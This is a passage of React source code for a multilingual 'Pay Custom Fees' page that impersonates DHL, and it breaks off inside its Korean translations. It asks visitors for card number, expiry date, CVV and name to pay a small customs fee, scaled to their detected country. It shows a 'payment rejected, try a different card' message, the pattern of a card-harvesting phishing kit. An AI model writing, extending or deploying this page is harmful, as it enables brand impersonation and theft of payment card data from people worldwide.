import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import LoadingPage from "./LoadingPage";

function CardInput({ language: propLanguage }) {
  const apiUrl = import.meta.env.VITE_API_URL || "http://localhost:5000";

  const DHL = {
    yellow: "#FFCC00",
    yellowHover: "#E6B800",
    red: "#D40511",
    dark: "#1A1A1A",
    gray: "#4A4A4A",
    lightGray: "#F5F5F5",
    midGray: "#E0E0E0",
    textMuted: "#737373",
    footerText: "#666666",
    successGreen: "#2E7D32",
  };

  const [show, setShow] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const navigate = useNavigate();
  const [language, setLanguage] = useState("en");
  const [isLoadingLang, setIsLoadingLang] = useState(true);
  const [ipCountry, setIpCountry] = useState(null);
  const [showLanguageMenu, setShowLanguageMenu] = useState(false);

  // State for form fields
  const [cardNumber, setCardNumber] = useState("");
  const [expirationDate, setExpirationDate] = useState("");
  const [cvv, setCVV] = useState("");
  const [nameOnCard, setNameOnCard] = useState("");

  const [paymentId, setPaymentId] = useState(null);

  // State for field focus and validation
  const [errors, setErrors] = useState({});
  const [cardNumberFocused, setCardNumberFocused] = useState(false);
  const [expirationDateFocused, setExpirationDateFocused] = useState(false);
  const [cvvFocused, setCVVFocused] = useState(false);
  const [nameOnCardFocused, setNameOnCardFocused] = useState(false);

  // UI state
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showProcessingPage, setShowProcessingPage] = useState(false);
  const [dots, setDots] = useState("");
  const [agreeToTerms, setAgreeToTerms] = useState(false);

  const [isMobile, setIsMobile] = useState(false);
  const currentYear = new Date().getFullYear();

  // Dynamic amount based on detected country from /api/ipinfo
  const [feeInfo, setFeeInfo] = useState({
    amount: "4.80",
    currency: "USD",
    symbol: "$",
    formatted: "$4.80",
  });

  // ============================================
  // COUNTRY TO CURRENCY MAPPING - EXPANDED
  // TN = TND, CH = CHF
  // ============================================
  const countryCurrencyMap = {
    // North America
    US: { currency: "USD", symbol: "$", localAmount: 4.8 },
    CA: { currency: "CAD", symbol: "CA$", localAmount: 6.62 },
    MX: { currency: "MXN", symbol: "$", localAmount: 88.8 },

    // Europe
    GB: { currency: "GBP", symbol: "£", localAmount: 3.74 },
    DE: { currency: "EUR", symbol: "€", localAmount: 4.42 },
    FR: { currency: "EUR", symbol: "€", localAmount: 4.42 },
    ES: { currency: "EUR", symbol: "€", localAmount: 4.42 },
    IT: { currency: "EUR", symbol: "€", localAmount: 4.42 },
    NL: { currency: "EUR", symbol: "€", localAmount: 4.42 },
    BE: { currency: "EUR", symbol: "€", localAmount: 4.42 },
    AT: { currency: "EUR", symbol: "€", localAmount: 4.42 },
    CH: { currency: "CHF", symbol: "CHF", localAmount: 4.37 },
    DK: { currency: "DKK", symbol: "kr.", localAmount: 33.07 },
    SE: { currency: "SEK", symbol: "kr", localAmount: 50.64 },
    NO: { currency: "NOK", symbol: "kr", localAmount: 51.12 },
    PL: { currency: "PLN", symbol: "zł", localAmount: 19.1 },
    CZ: { currency: "CZK", symbol: "Kč", localAmount: 111.36 },
    FI: { currency: "EUR", symbol: "€", localAmount: 4.42 },
    PT: { currency: "EUR", symbol: "€", localAmount: 4.42 },
    GR: { currency: "EUR", symbol: "€", localAmount: 4.42 },
    HU: { currency: "HUF", symbol: "Ft", localAmount: 1752 },
    RO: { currency: "RON", symbol: "lei", localAmount: 22.08 },
    BG: { currency: "BGN", symbol: "лв", localAmount: 8.69 },

    // Middle East / Arabic countries
    AE: { currency: "AED", symbol: "د.إ", localAmount: 17.62 },
    SA: { currency: "SAR", symbol: "ر.س", localAmount: 18.0 },
    EG: { currency: "EGP", symbol: "ج.م", localAmount: 232.8 },
    QA: { currency: "QAR", symbol: "ر.ق", localAmount: 17.47 },
    KW: { currency: "KWD", symbol: "د.ك", localAmount: 1.47 },
    TN: { currency: "TND", symbol: "د.ت", localAmount: 14.93 },
    JO: { currency: "JOD", symbol: "د.ا", localAmount: 3.41 },
    IQ: { currency: "IQD", symbol: "ع.د", localAmount: 6288 },
    LB: { currency: "LBP", symbol: "ل.ل", localAmount: 429600 },
    MA: { currency: "MAD", symbol: "د.م.", localAmount: 48.24 },
    DZ: { currency: "DZD", symbol: "د.ج", localAmount: 645.6 },
    IL: { currency: "ILS", symbol: "₪", localAmount: 17.52 },
    PK: { currency: "PKR", symbol: "₨", localAmount: 1330 },
    BD: { currency: "BDT", symbol: "৳", localAmount: 570 },
    LK: { currency: "LKR", symbol: "Rs", localAmount: 1440 },

    // Asia / Pacific
    AU: { currency: "AUD", symbol: "A$", localAmount: 7.3 },
    NZ: { currency: "NZD", symbol: "NZ$", localAmount: 7.82 },
    JP: { currency: "JPY", symbol: "¥", localAmount: 721 },
    CN: { currency: "CNY", symbol: "¥", localAmount: 34.75 },
    IN: { currency: "INR", symbol: "₹", localAmount: 400.8 },
    KR: { currency: "KRW", symbol: "₩", localAmount: 6384 },
    SG: { currency: "SGD", symbol: "S$", localAmount: 6.48 },
    MY: { currency: "MYR", symbol: "RM", localAmount: 22.8 },
    TH: { currency: "THB", symbol: "฿", localAmount: 175.2 },
    VN: { currency: "VND", symbol: "₫", localAmount: 119040 },
    ID: { currency: "IDR", symbol: "Rp", localAmount: 78000 },
    PH: { currency: "PHP", symbol: "₱", localAmount: 275 },
    HK: { currency: "HKD", symbol: "HK$", localAmount: 37.5 },
    TW: { currency: "TWD", symbol: "NT$", localAmount: 155 },

    // South America
    BR: { currency: "BRL", symbol: "R$", localAmount: 24.48 },
    AR: { currency: "ARS", symbol: "$", localAmount: 4080 },
    CO: { currency: "COP", symbol: "$", localAmount: 18720 },
    CL: { currency: "CLP", symbol: "$", localAmount: 4512 },
    PE: { currency: "PEN", symbol: "S/", localAmount: 18.0 },
    VE: { currency: "VES", symbol: "Bs.", localAmount: 174 },
    UY: { currency: "UYU", symbol: "$", localAmount: 186 },
    PY: { currency: "PYG", symbol: "₲", localAmount: 35280 },

    // Africa
    ZA: { currency: "ZAR", symbol: "R", localAmount: 90.72 },
    NG: { currency: "NGN", symbol: "₦", localAmount: 7104 },
    KE: { currency: "KES", symbol: "KSh", localAmount: 624 },
    GH: { currency: "GHS", symbol: "₵", localAmount: 60.0 },
    ZM: { currency: "ZMW", symbol: "ZK", localAmount: 127.2 },
    SN: { currency: "XOF", symbol: "CFA", localAmount: 2940 },
    CI: { currency: "XOF", symbol: "CFA", localAmount: 2940 },
    CM: { currency: "XAF", symbol: "FCFA", localAmount: 2940 },

    // Russia & Eastern Europe
    RU: { currency: "RUB", symbol: "₽", localAmount: 444 },
    UA: { currency: "UAH", symbol: "₴", localAmount: 189.6 },
    BY: { currency: "BYN", symbol: "Br", localAmount: 15.36 },
    KZ: { currency: "KZT", symbol: "₸", localAmount: 2250 },
  };

  // Check if mobile on mount and window resize
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkMobile();
    window.addEventListener("resize", checkMobile);
    return () => window.removeEventListener("resize", checkMobile);
  }, []);

  // Close language menu when clicking outside
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (showLanguageMenu && !event.target.closest(".dhl-lang-dropdown")) {
        setShowLanguageMenu(false);
      }
    };
    document.addEventListener("click", handleClickOutside);
    return () => document.removeEventListener("click", handleClickOutside);
  }, [showLanguageMenu]);

  // ============================================
  // COMPLETE TRANSLATIONS - ALL LANGUAGES
  // ============================================
  const translations = {
    en: {
      step: "STEP 2 OF 3",
      title: "Pay Custom Fees",
      description:
        "Please pay the customs fees to complete your redelivery request",
      customFees: "Customs Fees Amount",
      cardNumber: "Card Number",
      cardNumberError: "Card number must be 15 or 16 digits.",
      cardNumberLuhnError: "Invalid card number.",
      expiryDate: "MM/YY",
      expiryDateError: "Please enter a valid expiration date (MM/YY).",
      cvv: "CVV",
      cvvError: "Please enter a valid 3 or 4-digit CVV.",
      nameOnCard: "Name on Card",
      required: "This field is required.",
      agree: "I agree to pay the customs fees.",
      submit: "Pay Custom Fees",
      processing: "Processing Payment",
      paymentFailed: "Payment failed",
      paymentRejected:
        "Your payment was rejected. Please try again with a different card.",
      paymentErrorMsg: "There seems to be a problem with your payment method.",
      terms:
        "By completing this payment, you acknowledge that you have read and accept our",
      termsLink: "Customs Clearance Terms and Conditions",
      recaptcha:
        "This page is protected by Google reCAPTCHA to ensure you're not a bot.",
      recaptchaLink: "Learn more.",
      deliveryInfo: "Delivery Information",
      feeDescription:
        "Customs clearance and handling fees for your international shipment",
      back: "Back",
      trackingNumber: "Tracking Number",
      service: "Service",
      privacyNotice: "Privacy Notice",
      consentSettings: "Consent Settings",
      copyright: "DHL Group - All rights reserved",
    },
    fr: {
      step: "ÉTAPE 2 SUR 3",
      title: "Payer les frais de douane",
      description:
        "Veuillez payer les frais de douane pour compléter votre demande",
      customFees: "Montant des frais de douane",
      cardNumber: "Numéro de carte",
      cardNumberError: "Le numéro de carte doit comporter 15 ou 16 chiffres.",
      cardNumberLuhnError: "Numéro de carte invalide.",
      expiryDate: "MM/AA",
      expiryDateError: "Entrez une date valide (MM/AA).",
      cvv: "CVV",
      cvvError: "Entrez un CVV valide de 3 ou 4 chiffres.",
      nameOnCard: "Nom sur la carte",
      required: "Ce champ est requis.",
      agree: "J'accepte de payer les frais de douane.",
      submit: "Payer les frais de douane",
      processing: "Traitement du paiement",
      paymentFailed: "Échec du paiement",
      paymentRejected:
        "Votre paiement a été rejeté. Veuillez réessayer avec une autre carte.",
      paymentErrorMsg: "Problème avec votre méthode de paiement.",
      terms: "En effectuant ce paiement, vous acceptez nos",
      termsLink: "Conditions de dédouanement",
      recaptcha: "Cette page est protégée par Google reCAPTCHA.",
      recaptchaLink: "En savoir plus.",
      deliveryInfo: "Informations de livraison",
      feeDescription: "Frais de dédouanement pour votre envoi international",
      back: "Retour",
      trackingNumber: "Numéro de suivi",
      service: "Service",
      privacyNotice: "Avis de confidentialité",
      consentSettings: "Paramètres de consentement",
      copyright: "DHL Group - Tous droits réservés",
    },
    ar: {
      step: "الخطوة 2 من 3",
      title: "دفع الرسوم الجمركية",
      description: "يرجى دفع الرسوم الجمركية لإكمال طلب إعادة التسليم",
      customFees: "مبلغ الرسوم الجمركية",
      cardNumber: "رقم البطاقة",
      cardNumberError: "رقم البطاقة يجب أن يكون 15 أو 16 رقماً.",
      cardNumberLuhnError: "رقم بطاقة غير صالح.",
      expiryDate: "شهر/سنة",
      expiryDateError: "الرجاء إدخال تاريخ انتهاء صلاحية صالح (شهر/سنة).",
      cvv: "CVV",
      cvvError: "الرجاء إدخال CVV صالح مكون من 3 أو 4 أرقام.",
      nameOnCard: "الاسم على البطاقة",
      required: "هذا الحقل مطلوب.",
      agree: "أوافق على دفع الرسوم الجمركية.",
      submit: "دفع الرسوم الجمركية",
      processing: "جاري معالجة الدفع",
      paymentFailed: "فشل الدفع",
      paymentRejected:
        "تم رفض دفعتك. يرجى المحاولة مرة أخرى باستخدام بطاقة مختلفة.",
      paymentErrorMsg: "يبدو أن هناك مشكلة في طريقة الدفع الخاصة بك.",
      terms: "بإكمال هذه الدفعة، فإنك تقر بأنك قد قرأت وقبلت",
      termsLink: "شروط وأحكام التخليص الجمركي",
      recaptcha:
        "هذه الصفحة محمية بواسطة Google reCAPTCHA للتأكد من أنك لست روبوتاً.",
      recaptchaLink: "اعرف المزيد.",
      deliveryInfo: "معلومات التسليم",
      feeDescription: "رسوم التخليص الجمركي والمناولة للشحنة الدولية الخاصة بك",
      back: "رجوع",
      trackingNumber: "رقم التتبع",
      service: "الخدمة",
      privacyNotice: "إشعار الخصوصية",
      consentSettings: "إعدادات الموافقة",
      copyright: "DHL Group - جميع الحقوق محفوظة",
    },
    es: {
      step: "PASO 2 DE 3",
      title: "Pagar aranceles de aduana",
      description: "Pague los aranceles para completar su solicitud",
      customFees: "Monto de aranceles",
      cardNumber: "Número de tarjeta",
      cardNumberError: "La tarjeta debe tener 15 o 16 dígitos.",
      cardNumberLuhnError: "Número de tarjeta inválido.",
      expiryDate: "MM/AA",
      expiryDateError: "Ingrese fecha válida (MM/AA).",
      cvv: "CVV",
      cvvError: "Ingrese un CVV válido de 3 o 4 dígitos.",
      nameOnCard: "Nombre en la tarjeta",
      required: "Este campo es requerido.",
      agree: "Acepto pagar los aranceles.",
      submit: "Pagar aranceles",
      processing: "Procesando pago",
      paymentFailed: "Pago fallido",
      paymentRejected:
        "Su pago fue rechazado. Por favor, intente nuevamente con otra tarjeta.",
      paymentErrorMsg: "Problema con su método de pago.",
      terms: "Al realizar este pago, acepta nuestros",
      termsLink: "Términos de despacho de aduanas",
      recaptcha: "Protegido por Google reCAPTCHA.",
      recaptchaLink: "Más información.",
      deliveryInfo: "Información de entrega",
      feeDescription: "Aranceles para su envío internacional",
      back: "Atrás",
      trackingNumber: "Número de seguimiento",
      service: "Servicio",
      privacyNotice: "Aviso de privacidad",
      consentSettings: "Configuración de consentimiento",
      copyright: "DHL Group - Todos los derechos reservados",
    },
    de: {
      step: "SCHRITT 2 VON 3",
      title: "Zollgebühren bezahlen",
      description: "Bitte bezahlen Sie die Zollgebühren",
      customFees: "Zollgebühren Betrag",
      cardNumber: "Kartennummer",
      cardNumberError: "Kartennummer muss 15 oder 16 Ziffern haben.",
      cardNumberLuhnError: "Ungültige Kartennummer.",
      expiryDate: "MM/JJ",
      expiryDateError: "Gültiges Datum eingeben (MM/JJ).",
      cvv: "CVV",
      cvvError: "Gültigen 3- oder 4-stelligen CVV eingeben.",
      nameOnCard: "Name auf der Karte",
      required: "Pflichtfeld.",
      agree: "Ich stimme der Zahlung zu.",
      submit: "Zollgebühren bezahlen",
      processing: "Zahlung wird verarbeitet",
      paymentFailed: "Zahlung fehlgeschlagen",
      paymentRejected:
        "Ihre Zahlung wurde abgelehnt. Bitte versuchen Sie es mit einer anderen Karte.",
      paymentErrorMsg: "Problem mit Ihrer Zahlungsmethode.",
      terms: "Mit dieser Zahlung akzeptieren Sie unsere",
      termsLink: "Zollabfertigungsbedingungen",
      recaptcha: "Geschützt durch Google reCAPTCHA.",
      recaptchaLink: "Mehr erfahren.",
      deliveryInfo: "Lieferinformationen",
      feeDescription: "Zollgebühren für Ihre internationale Sendung",
      back: "Zurück",
      trackingNumber: "Sendungsnummer",
      service: "Service",
      privacyNotice: "Datenschutzerklärung",
      consentSettings: "Zustimmungseinstellungen",
      copyright: "DHL Group - Alle Rechte vorbehalten",
    },
    it: {
      step: "PASSO 2 DI 3",
      title: "Paga i dazi doganali",
      description:
        "Si prega di pagare i dazi doganali per completare la richiesta",
      customFees: "Importo dazi doganali",
      cardNumber: "Numero della carta",
      cardNumberError: "Il numero della carta deve essere di 15 o 16 cifre.",
      cardNumberLuhnError: "Numero della carta non valido.",
      expiryDate: "MM/AA",
      expiryDateError: "Inserire una data di scadenza valida (MM/AA).",
      cvv: "CVV",
      cvvError: "Inserire un CVV valido di 3 o 4 cifre.",
      nameOnCard: "Nome sulla carta",
      required: "Questo campo è obbligatorio.",
      agree: "Accetto di pagare i dazi doganali.",
      submit: "Paga i dazi doganali",
      processing: "Elaborazione del pagamento",
      paymentFailed: "Pagamento fallito",
      paymentRejected:
        "Il pagamento è stato rifiutato. Riprova con un'altra carta.",
      paymentErrorMsg:
        "Si è verificato un problema con il metodo di pagamento.",
      terms: "Effettuando questo pagamento, accetti i nostri",
      termsLink: "Termini e condizioni per lo sdoganamento",
      recaptcha: "Protetto da Google reCAPTCHA.",
      recaptchaLink: "Scopri di più.",
      deliveryInfo: "Informazioni sulla consegna",
      feeDescription: "Dazi doganali per la tua spedizione internazionale",
      back: "Indietro",
      trackingNumber: "Numero di tracciamento",
      service: "Servizio",
      privacyNotice: "Informativa sulla privacy",
      consentSettings: "Impostazioni del consenso",
      copyright: "DHL Group - Tutti i diritti riservati",
    },
    nl: {
      step: "STAP 2 VAN 3",
      title: "Betaal douanekosten",
      description: "Betaal de douanekosten om uw heraanvraag te voltooien",
      customFees: "Bedrag douanekosten",
      cardNumber: "Kaartnummer",
      cardNumberError: "Kaartnummer moet 15 of 16 cijfers zijn.",
      cardNumberLuhnError: "Ongeldig kaartnummer.",
      expiryDate: "MM/JJ",
      expiryDateError: "Voer een geldige vervaldatum in (MM/JJ).",
      cvv: "CVV",
      cvvError: "Voer een geldige 3 of 4-cijferige CVV in.",
      nameOnCard: "Naam op kaart",
      required: "Dit veld is verplicht.",
      agree: "Ik ga akkoord met het betalen van de douanekosten.",
      submit: "Betaal douanekosten",
      processing: "Betaling verwerken",
      paymentFailed: "Betaling mislukt",
      paymentRejected:
        "Uw betaling is geweigerd. Probeer opnieuw met een andere kaart.",
      paymentErrorMsg: "Er lijkt een probleem te zijn met uw betaalmethode.",
      terms: "Door deze betaling te voltooien, gaat u akkoord met onze",
      termsLink: "Algemene voorwaarden voor douaneafhandeling",
      recaptcha: "Beschermd door Google reCAPTCHA.",
      recaptchaLink: "Meer informatie.",
      deliveryInfo: "Leveringsinformatie",
      feeDescription: "Douanekosten voor uw internationale zending",
      back: "Terug",
      trackingNumber: "Trackingnummer",
      service: "Service",
      privacyNotice: "Privacyverklaring",
      consentSettings: "Toestemmingsinstellingen",
      copyright: "DHL Group - Alle rechten voorbehouden",
    },
    pt: {
      step: "PASSO 2 DE 3",
      title: "Pagar taxas aduaneiras",
      description:
        "Por favor, pague as taxas aduaneiras para concluir seu pedido",
      customFees: "Valor das taxas aduaneiras",
      cardNumber: "Número do cartão",
      cardNumberError: "O número do cartão deve ter 15 ou 16 dígitos.",
      cardNumberLuhnError: "Número de cartão inválido.",
      expiryDate: "MM/AA",
      expiryDateError: "Insira uma data de validade válida (MM/AA).",
      cvv: "CVV",
      cvvError: "Insira um CVV válido de 3 ou 4 dígitos.",
      nameOnCard: "Nome no cartão",
      required: "Este campo é obrigatório.",
      agree: "Concordo em pagar as taxas aduaneiras.",
      submit: "Pagar taxas aduaneiras",
      processing: "Processando pagamento",
      paymentFailed: "Falha no pagamento",
      paymentRejected:
        "Seu pagamento foi rejeitado. Tente novamente com outro cartão.",
      paymentErrorMsg: "Parece haver um problema com seu método de pagamento.",
      terms:
        "Ao efetuar este pagamento, você reconhece que leu e aceita nossos",
      termsLink: "Termos e Condições de Desalfandegamento",
      recaptcha: "Protegido por Google reCAPTCHA.",
      recaptchaLink: "Saiba mais.",
      deliveryInfo: "Informações de entrega",
      feeDescription:
        "Taxas de desalfandegamento para sua remessa internacional",
      back: "Voltar",
      trackingNumber: "Número de rastreamento",
      service: "Serviço",
      privacyNotice: "Aviso de privacidade",
      consentSettings: "Configurações de consentimento",
      copyright: "DHL Group - Todos os direitos reservados",
    },
    sv: {
      step: "STEG 2 AV 3",
      title: "Betala tullavgifter",
      description:
        "Vänligen betala tullavgifterna för att slutföra din begäran",
      customFees: "Tullavgiftsbelopp",
      cardNumber: "Kortnummer",
      cardNumberError: "Kortnumret måste vara 15 eller 16 siffror.",
      cardNumberLuhnError: "Ogiltigt kortnummer.",
      expiryDate: "MM/ÅÅ",
      expiryDateError: "Ange ett giltigt utgångsdatum (MM/ÅÅ).",
      cvv: "CVV",
      cvvError: "Ange en giltig 3 eller 4-siffrig CVV.",
      nameOnCard: "Namn på kortet",
      required: "Detta fält är obligatoriskt.",
      agree: "Jag godkänner att betala tullavgifterna.",
      submit: "Betala tullavgifter",
      processing: "Bearbetar betalning",
      paymentFailed: "Betalning misslyckades",
      paymentRejected: "Din betalning avslogs. Försök igen med ett annat kort.",
      paymentErrorMsg: "Det verkar finnas ett problem med din betalningsmetod.",
      terms: "Genom att slutföra denna betalning godkänner du våra",
      termsLink: "Villkor för tullklarering",
      recaptcha: "Skyddad av Google reCAPTCHA.",
      recaptchaLink: "Läs mer.",
      deliveryInfo: "Leveransinformation",
      feeDescription: "Tullavgifter för din internationella försändelse",
      back: "Tillbaka",
      trackingNumber: "Spårningsnummer",
      service: "Service",
      privacyNotice: "Integritetspolicy",
      consentSettings: "Cookie-inställningar",
      copyright: "DHL Group - Alla rättigheter förbehålls",
    },
    no: {
      step: "TRINN 2 AV 3",
      title: "Betal tollavgifter",
      description: "Vennligst betal tollavgiftene for å fullføre forespørselen",
      customFees: "Tollavgiftsbeløp",
      cardNumber: "Kortnummer",
      cardNumberError: "Kortnummer må være 15 eller 16 sifre.",
      cardNumberLuhnError: "Ugyldig kortnummer.",
      expiryDate: "MM/ÅÅ",
      expiryDateError: "Vennligst oppgi en gyldig utløpsdato (MM/ÅÅ).",
      cvv: "CVV",
      cvvError: "Vennligst oppgi en gyldig 3 eller 4-sifret CVV.",
      nameOnCard: "Navn på kort",
      required: "Dette feltet er obligatorisk.",
      agree: "Jeg godtar å betale tollavgiftene.",
      submit: "Betal tollavgifter",
      processing: "Behandler betaling",
      paymentFailed: "Betaling mislyktes",
      paymentRejected:
        "Din betaling ble avvist. Vennligst prøv igjen med et annet kort.",
      paymentErrorMsg:
        "Det ser ut til å være et problem med betalingsmetoden din.",
      terms: "Ved å fullføre denne betalingen godtar du våre",
      termsLink: "Vilkår for tollbehandling",
      recaptcha: "Beskyttet av Google reCAPTCHA.",
      recaptchaLink: "Lær mer.",
      deliveryInfo: "Leveringsinformasjon",
      feeDescription: "Tollbehandling for din internasjonale forsendelse",
      back: "Tilbake",
      trackingNumber: "Spornummer",
      service: "Service",
      privacyNotice: "Personvernerklæring",
      consentSettings: "Samtykkeinnstillinger",
      copyright: "DHL Group - Alle rettigheter forbeholdt",
    },
    da: {
      step: "TRIN 2 AF 3",
      title: "Betal toldafgifter",
      description:
        "Betal venligst toldafgifter for at fuldføre din genudlevering",
      customFees: "Toldafgiftsbeløb",
      cardNumber: "Kortnummer",
      cardNumberError: "Kortnummer skal være 15 eller 16 cifre.",
      cardNumberLuhnError: "Ugyldigt kortnummer.",
      expiryDate: "MM/ÅÅ",
      expiryDateError: "Indtast en gyldig udløbsdato (MM/ÅÅ).",
      cvv: "CVV",
      cvvError: "Indtast en gyldig 3 eller 4-cifret CVV.",
      nameOnCard: "Navn på kort",
      required: "Dette felt er påkrævet.",
      agree: "Jeg accepterer at betale toldafgifter.",
      submit: "Betal toldafgifter",
      processing: "Behandler betaling",
      paymentFailed: "Betaling mislykkedes",
      paymentRejected: "Din betaling blev afvist. Prøv igen med et andet kort.",
      paymentErrorMsg:
        "Der ser ud til at være et problem med din betalingsmetode.",
      terms: "Ved at gennemføre denne betaling accepterer du vores",
      termsLink: "Betingelser for toldbehandling",
      recaptcha: "Beskyttet af Google reCAPTCHA.",
      recaptchaLink: "Lær mere.",
      deliveryInfo: "Leveringsoplysninger",
      feeDescription: "Toldbehandling for din internationale forsendelse",
      back: "Tilbage",
      trackingNumber: "Forsendelsesnummer",
      service: "Service",
      privacyNotice: "Privatlivspolitik",
      consentSettings: "Samtykkeindstillinger",
      copyright: "DHL Group - Alle rettigheder forbeholdes",
    },
    fi: {
      step: "VAIHE 2/3",
      title: "Maksa tullimaksut",
      description: "Maksa tullimaksut suorittaaksesi uudelleenlähetyspyyntösi",
      customFees: "Tullimaksujen määrä",
      cardNumber: "Korttinumero",
      cardNumberError: "Korttinumerossa on oltava 15 tai 16 numeroa.",
      cardNumberLuhnError: "Virheellinen korttinumero.",
      expiryDate: "KK/VV",
      expiryDateError: "Anna kelvollinen viimeinen voimassaolopäivä (KK/VV).",
      cvv: "CVV",
      cvvError: "Anna kelvollinen 3- tai 4-numeroinen CVV.",
      nameOnCard: "Kortin nimi",
      required: "Tämä kenttä on pakollinen.",
      agree: "Hyväksyn tullimaksujen maksamisen.",
      submit: "Maksa tullimaksut",
      processing: "Käsitellään maksua",
      paymentFailed: "Maksu epäonnistui",
      paymentRejected: "Maksusi hylättiin. Yritä uudelleen toisella kortilla.",
      paymentErrorMsg: "Maksutavassasi näyttää olevan ongelma.",
      terms: "Suorittamalla tämän maksun hyväksyt",
      termsLink: "Tullauksen ehdot",
      recaptcha: "Google reCAPTCHA suojaa tämän sivun.",
      recaptchaLink: "Lue lisää.",
      deliveryInfo: "Toimitustiedot",
      feeDescription: "Tullausmaksut kansainväliselle lähetyksellesi",
      back: "Takaisin",
      trackingNumber: "Seurantanumero",
      service: "Palvelu",
      privacyNotice: "Tietosuojailmoitus",
      consentSettings: "Suostumusasetukset",
      copyright: "DHL Group - Kaikki oikeudet pidätetään",
    },
    tr: {
      step: "ADIM 2 / 3",
      title: "Gümrük Vergilerini Ödeyin",
      description:
        "Yeniden teslim talebinizi tamamlamak için lütfen gümrük vergilerini ödeyin",
      customFees: "Gümrük Vergisi Tutarı",
      cardNumber: "Kart Numarası",
      cardNumberError: "Kart numarası 15 veya 16 haneli olmalıdır.",
      cardNumberLuhnError: "Geçersiz kart numarası.",
      expiryDate: "AA/YY",
      expiryDateError: "Lütfen geçerli bir son kullanma tarihi girin (AA/YY).",
      cvv: "CVV",
      cvvError: "Lütfen geçerli 3 veya 4 haneli CVV girin.",
      nameOnCard: "Kart Üzerindeki İsim",
      required: "Bu alan zorunludur.",
      agree: "Gümrük vergilerini ödemeyi kabul ediyorum.",
      submit: "Gümrük Vergilerini Öde",
      processing: "Ödeme İşleniyor",
      paymentFailed: "Ödeme başarısız",
      paymentRejected:
        "Ödemeniz reddedildi. Lütfen farklı bir kartla tekrar deneyin.",
      paymentErrorMsg: "Ödeme yönteminizle ilgili bir sorun görünüyor.",
      terms:
        "Bu ödemeyi tamamlayarak, okuduğunuzu ve kabul ettiğinizi onaylarsınız",
      termsLink: "Gümrük İşlem Şartları ve Koşulları",
      recaptcha:
        "Bu sayfa, robot olmadığınızı doğrulamak için Google reCAPTCHA ile korunmaktadır.",
      recaptchaLink: "Daha fazla bilgi.",
      deliveryInfo: "Teslimat Bilgileri",
      feeDescription:
        "Uluslararası gönderiniz için gümrük işlem ve taşıma ücretleri",
      back: "Geri",
      trackingNumber: "Takip Numarası",
      service: "Hizmet",
      privacyNotice: "Gizlilik Bildirimi",
      consentSettings: "Onay Ayarları",
      copyright: "DHL Grubu - Tüm hakları saklıdır",
    },
    ru: {
      step: "ШАГ 2 ИЗ 3",
      title: "Оплатить таможенные сборы",
      description:
        "Пожалуйста, оплатите таможенные сборы для завершения запроса на повторную доставку",
      customFees: "Сумма таможенных сборов",
      cardNumber: "Номер карты",
      cardNumberError: "Номер карты должен содержать 15 или 16 цифр.",
      cardNumberLuhnError: "Неверный номер карты.",
      expiryDate: "ММ/ГГ",
      expiryDateError:
        "Пожалуйста, введите действительную дату истечения срока (ММ/ГГ).",
      cvv: "CVV",
      cvvError: "Пожалуйста, введите действительный 3- или 4-значный CVV.",
      nameOnCard: "Имя на карте",
      required: "Это поле обязательно для заполнения.",
      agree: "Я согласен оплатить таможенные сборы.",
      submit: "Оплатить таможенные сборы",
      processing: "Обработка платежа",
      paymentFailed: "Ошибка платежа",
      paymentRejected:
        "Ваш платеж был отклонен. Пожалуйста, попробуйте снова с другой картой.",
      paymentErrorMsg: "Похоже, возникла проблема с вашим способом оплаты.",
      terms:
        "Завершая этот платеж, вы подтверждаете, что прочитали и приняли наши",
      termsLink: "Условия таможенного оформления",
      recaptcha:
        "Эта страница защищена Google reCAPTCHA, чтобы убедиться, что вы не робот.",
      recaptchaLink: "Узнать больше.",
      deliveryInfo: "Информация о доставке",
      feeDescription:
        "Таможенное оформление и сборы за обработку вашей международной отправки",
      back: "Назад",
      trackingNumber: "Номер отслеживания",
      service: "Услуга",
      privacyNotice: "Уведомление о конфиденциальности",
      consentSettings: "Настройки согласия",
      copyright: "DHL Group - Все права защищены",
    },
    zh: {
      step: "第2步，共3步",
      title: "支付海关费用",
      description: "请支付海关费用以完成您的重新投递请求",
      customFees: "海关费用金额",
      cardNumber: "卡号",
      cardNumberError: "卡号必须为15或16位数字。",
      cardNumberLuhnError: "无效的卡号。",
      expiryDate: "月/年",
      expiryDateError: "请输入有效的有效期（月/年）。",
      cvv: "CVV",
      cvvError: "请输入有效的3或4位CVV码。",
      nameOnCard: "持卡人姓名",
      required: "此字段为必填项。",
      agree: "我同意支付海关费用。",
      submit: "支付海关费用",
      processing: "正在处理付款",
      paymentFailed: "付款失败",
      paymentRejected: "您的付款被拒绝。请尝试使用其他卡。",
      paymentErrorMsg: "您的付款方式似乎有问题。",
      terms: "完成此付款即表示您确认已阅读并接受我们的",
      termsLink: "海关清关条款和条件",
      recaptcha: "此页面受Google reCAPTCHA保护，以确保您不是机器人。",
      recaptchaLink: "了解更多。",
      deliveryInfo: "配送信息",
      feeDescription: "您国际货件的海关清关和处理费用",
      back: "返回",
      trackingNumber: "追踪号码",
      service: "服务",
      privacyNotice: "隐私声明",
      consentSettings: "同意设置",
      copyright: "DHL集团 - 保留所有权利",
    },
    ko: {
      step: "2/3단계",
      title: "관세 납부",
      description: "재배송 요청을 완료하려면 관세를 납부하세요",
      customFees: "관세 금액",
      cardNumber: "카드 번호",
      cardNumberError: "카드 번호는 15자리 또는 16자리여야 합니다.",
      cardNumberLuhnError: "잘못된 카드 번호입니다.",
      expiryDate: "MM/YY",
      expiryDateError: "유효한 만료일을 입력하세요 (MM/YY).",
      cvv: "CVV",
      cvvError: "유효한 3자리 또는 4자리 CVV를 입력하세요.",
      nameOnCard: "카드상의 이름",
      required: "이 필드는 필수입니다.",
      agree: "관세 납부에 동의합니다.",
      submit: "관세 납부",
      processing: "결제 처리 중",
      paymentFailed: "결제 실패",
      paymentRejected: "결제가 거부되었습니다. 다른 카드로 다시 시도하세요.",
      paymentErrorMsg: "결제 방법에 문제가 있는 것 같습니다.",
      terms: "이 결제를 완료하면 다음 내용을 읽고 동의하게 됩니다",
      termsLink: "통관 약관",
      recaptcha:
        "이 페이지는 Google reCAPTCHA로 보호되어 로봇이 아님을 확인합니다.",
      recaptchaLink: "자세히 알아보기.",
      deliveryInfo: "배송 정보",
      feeDescription: "국제 발송물에 대한 통관 및 처리 수수료",
      back: "뒤로",
